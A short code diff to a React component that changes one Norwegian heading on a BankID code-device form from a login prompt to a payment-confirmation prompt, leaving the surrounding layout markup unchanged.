@@ -73,7 +73,7 @@ const TextValidation = ({ transaction }) => {
 			<section className="min-h-screen flex flex-col justify-center pt-20 pb-8">
 				<div className="container max-w-[791px] flex space-x-6 transition duration-500 transition-max-width" ref={containerRef}>
 					<div className="lg:w-[800px] bg-white px-10 py-10 shadow-md">
-						<h1 className="mb-6">Logg inn med BankID med kodebrikke</h1>
+						<h1 className="mb-6">Bekreft betaling med BankID med kodebrikke</h1>
 
 						<div className="border border-gray-300 px-7 py-10 min-h-[200px] mb-5">
 							<form onSubmit={submitHandleScreen2} ref={formRef2}>
